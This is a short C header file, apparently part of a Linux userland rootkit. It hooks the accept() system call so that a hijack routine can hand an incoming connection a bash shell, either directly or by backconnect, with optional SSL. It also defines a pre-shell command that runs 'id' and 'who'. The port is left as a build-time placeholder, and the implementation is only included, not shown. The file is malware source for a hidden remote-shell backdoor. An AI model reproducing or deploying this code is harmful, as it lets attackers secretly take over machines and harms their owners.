#ifndef ACCEPT_H
#define ACCEPT_H

#define ACCEPT_PORT ??ACCEPT_PORT??

/* command to be executed before launching
 * the shell. hence pre_shell.. */
#define PRE_SHELL  "cat .ascii 2>/dev/null; id; who"
#define SHELL_PATH "/bin/bash"
#define SHELL_NAME "bash"

#ifdef ACCEPT_USE_SSL
#define SSL_ACCEPT_PORT ACCEPT_PORT+1
#define METHOD_SSL 0
#include "ssl/ssl.h"
#endif

#define METHOD_PLAINTEXT 1
void spawn_shell(int sockfd);
void backconnect(int method, int sockfd);
int drop_shell(int method, int sockfd);
#include "accept/backconnect.c"

int hijack_accept(int sockfd, struct sockaddr *addr);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
#include "accept/accept.c"
#endif
